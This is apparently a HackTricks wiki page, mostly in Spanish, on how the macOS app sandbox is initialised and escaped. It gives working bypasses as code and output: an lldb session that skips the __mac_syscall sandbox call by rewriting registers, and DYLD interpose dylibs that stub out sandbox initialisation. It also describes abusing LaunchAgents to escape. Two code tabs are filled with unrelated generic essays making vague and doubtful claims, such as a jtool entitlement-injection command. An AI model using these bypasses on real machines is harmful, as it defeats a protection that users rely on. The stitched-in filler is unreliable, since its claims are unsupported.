# Depuración y Bypass del Sandbox de macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Proceso de carga del Sandbox

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Imagen de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

En la imagen anterior se puede observar **cómo se cargará el sandbox** cuando se ejecute una aplicación con la concesión **`com.apple.security.app-sandbox`**.

El compilador vinculará `/usr/lib/libSystem.B.dylib` al binario.

Luego, **`libSystem.B`** llamará a otras varias funciones hasta que **`xpc_pipe_routine`** envíe las concesiones de la aplicación a **`securityd`**. Securityd comprueba si el proceso debe ser puesto en cuarentena dentro del Sandbox, y si es así, se pondrá en cuarentena.\
Finalmente, el sandbox se activará con una llamada a **`__sandbox_ms`** que llamará a **`__mac_syscall`**.

## Posibles Bypasses

{% hint style="warning" %}
Ten en cuenta que los **archivos creados por procesos en el sandbox** se les añade el **atributo de cuarentena** para evitar que se escape del sandbox.
{% endhint %}

### Ejecutar binarios sin Sandbox

Si ejecutas un binario que no esté en el sandbox desde un binario en el sandbox, se **ejecutará dentro del sandbox del proceso padre**.

### Depuración y bypass del Sandbox con lldb

Compilaremos una aplicación que debería estar en el sandbox:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}

# Depuración y bypass de macOS Sandbox

La sandbox de macOS es una característica de seguridad que limita el acceso de las aplicaciones a los recursos del sistema. Sin embargo, como cualquier medida de seguridad, no es infalible y puede ser vulnerada. En este archivo se describen algunas técnicas para depurar y evitar la sandbox de macOS.

## Depuración de la sandbox

Para depurar la sandbox de macOS, se puede utilizar el depurador `lldb`. Primero, se debe obtener el PID del proceso que se desea depurar. Esto se puede hacer con el comando `ps` o con el Monitor de Actividad de macOS. Una vez que se tiene el PID, se puede iniciar `lldb` con el siguiente comando:

```
$ lldb -p <PID>
```

Una vez que se ha iniciado `lldb`, se puede utilizar el comando `process continue` para continuar la ejecución del proceso. En este punto, se puede establecer un punto de interrupción en el código de la aplicación y examinar el estado de la sandbox.

## Bypass de la sandbox

Existen varias técnicas para evitar la sandbox de macOS. Una de ellas es utilizar una vulnerabilidad en la aplicación para obtener acceso a recursos del sistema que normalmente estarían restringidos por la sandbox. Otra técnica es utilizar una aplicación que ya tenga permisos para acceder a los recursos del sistema y que permita ejecutar comandos en nombre de la aplicación sandbox.

Otra técnica es modificar el archivo `entitlements.xml` de la aplicación para agregar permisos adicionales. Esto se puede hacer utilizando una herramienta como `jtool`. Por ejemplo, para agregar el permiso `com.apple.security.cs.allow-jit` se puede ejecutar el siguiente comando:

```
$ jtool --ent /path/to/app/Contents/MacOS/app | sed 's/<\/dict>/<key>com.apple.security.cs.allow-jit<\/key><true\/><\/dict>/' | jtool --sign --inplace --ent - /path/to/app/Contents/MacOS/app
```

Esto agregará el permiso `com.apple.security.cs.allow-jit` al archivo `entitlements.xml` de la aplicación y permitirá que la aplicación ejecute código compilado en tiempo de ejecución.

## Conclusión

La sandbox de macOS es una característica importante de seguridad que limita el acceso de las aplicaciones a los recursos del sistema. Sin embargo, como cualquier medida de seguridad, no es infalible y puede ser vulnerada. Es importante comprender las técnicas utilizadas para depurar y evitar la sandbox de macOS para poder proteger adecuadamente los sistemas macOS.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %}

## macOS Sandbox Debug and Bypass

The macOS sandbox is a powerful security feature that restricts the actions that a process can perform on a system. However, it is not perfect and can be bypassed or debugged in certain circumstances. In this section, we will explore some techniques for debugging and bypassing the macOS sandbox.

### Debugging the macOS Sandbox

Debugging the macOS sandbox can be useful for understanding how it works and identifying potential vulnerabilities. There are several tools that can be used for debugging the sandbox, including:

- **sandbox-exec**: This is a command-line tool that can be used to run a process in a sandbox and debug it. It allows you to specify the sandbox profile to use and provides options for tracing system calls and logging sandbox violations.

- **lldb**: This is a powerful debugger that can be used to attach to a process running in a sandbox and debug it. It allows you to set breakpoints, inspect memory, and modify variables.

- **dtruss**: This is a tool that can be used to trace system calls made by a process running in a sandbox. It can be useful for understanding how the sandbox is enforcing restrictions on the process.

### Bypassing the macOS Sandbox

Bypassing the macOS sandbox can be useful for performing actions that are restricted by the sandbox. There are several techniques that can be used for bypassing the sandbox, including:

- **Exploiting a vulnerability**: If a vulnerability exists in the sandbox or in a process running in the sandbox, it may be possible to exploit it to bypass the sandbox.

- **Using a signed binary**: If a binary is signed with a valid Apple Developer ID, it may be possible to bypass the sandbox by using a technique known as "entitlement spoofing". This involves modifying the binary to include additional entitlements that allow it to perform actions that are normally restricted by the sandbox.

- **Using a kernel extension**: If a kernel extension is loaded into the kernel, it can bypass the sandbox and perform actions that are normally restricted. However, loading a kernel extension requires root privileges and is not recommended.

- **Using a third-party library**: If a third-party library is used by a process running in the sandbox, it may be possible to bypass the sandbox by exploiting a vulnerability in the library.

It is important to note that bypassing the macOS sandbox is a serious security issue and should only be done for legitimate purposes, such as penetration testing or vulnerability research.
```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Luego compila la aplicación:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
La aplicación intentará **leer** el archivo **`~/Desktop/del.txt`**, lo cual el **Sandbox no permitirá**.\
Cree un archivo allí ya que una vez que se haya evadido el Sandbox, podrá leerlo:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Depuremos la aplicación de ajedrez para ver cuándo se carga el Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660
  
# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
Incluso con el Sandbox evadido, TCC preguntará al usuario si desea permitir que el proceso lea archivos del escritorio.
{% endhint %}

### Abusando de otros procesos

Si desde el proceso del sandbox eres capaz de **comprometer otros procesos** que se ejecutan en sandboxes menos restrictivos (o sin ellos), podrás escapar a sus sandboxes:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Bypass de Interposting

Para obtener más información sobre **Interposting**, consulta:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### Interponer `_libsecinit_initializer` para evitar el sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interponer `__mac_syscall` para evitar el Sandbox

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Compilación estática y vinculación dinámica

[**Esta investigación**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descubrió 2 formas de eludir el Sandbox. Debido a que el sandbox se aplica desde el espacio de usuario cuando se carga la biblioteca **libSystem**. Si un binario pudiera evitar cargarlo, nunca se sandboxearía:

* Si el binario estuviera **completamente compilado estáticamente**, podría evitar cargar esa biblioteca.
* Si el **binario no necesitara cargar ninguna biblioteca** (porque el enlazador también está en libSystem), no necesitaría cargar libSystem.&#x20;

### Shellcodes

Tenga en cuenta que **incluso los shellcodes** en ARM64 deben vincularse en `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Abuso de ubicaciones de inicio automático

Si un proceso con sandbox puede **escribir** en un lugar donde **más tarde se ejecutará el binario de una aplicación sin sandbox**, podrá **escapar simplemente colocando** allí el binario. Un buen ejemplo de este tipo de ubicaciones son `~/Library/LaunchAgents` o `/System/Library/LaunchDaemons`.

Para esto, incluso puede necesitar **2 pasos**: hacer que un proceso con un sandbox **más permisivo** (`file-read*`, `file-write*`) ejecute su código, que en realidad escribirá en un lugar donde se ejecutará **sin sandbox**.

Consulte esta página sobre **ubicaciones de inicio automático**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Referencias

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
